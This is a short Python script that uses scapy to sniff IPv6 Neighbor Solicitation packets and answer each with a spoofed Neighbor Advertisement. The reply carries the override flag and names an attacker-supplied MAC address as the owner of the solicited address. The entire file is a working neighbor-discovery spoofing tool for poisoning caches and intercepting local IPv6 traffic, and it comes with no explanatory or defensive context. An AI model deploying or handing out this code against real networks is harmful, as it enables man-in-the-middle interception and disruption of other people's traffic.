#!/usr/bin/python
import sys
from scapy.layers.inet6 import ICMPv6ND_NS, IPv6, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import sniff, send

# Ask user to insert value
if len(sys.argv) == 2:
    attack_mac = sys.argv[1]
else:
    print("Please insert:\n 1. Attacker's MAC address")
    sys.exit(1)

# Generate packet
while True:
    packet_capture = sniff(lfilter=lambda pkt: ICMPv6ND_NS in pkt, count=1)
    base = IPv6()
    base.src = packet_capture[0][IPv6][ICMPv6ND_NS].tgt
    base.dst = packet_capture[0][IPv6].src
    packet_response = base / ICMPv6ND_NA(R=1, S=0, O=1, tgt=base.src) / \
                      ICMPv6NDOptSrcLLAddr(lladdr=attack_mac)
    send(packet_response, verbose=False)
    print("Answering NA to a NS message from address: " + packet_capture[0][IPv6].src)
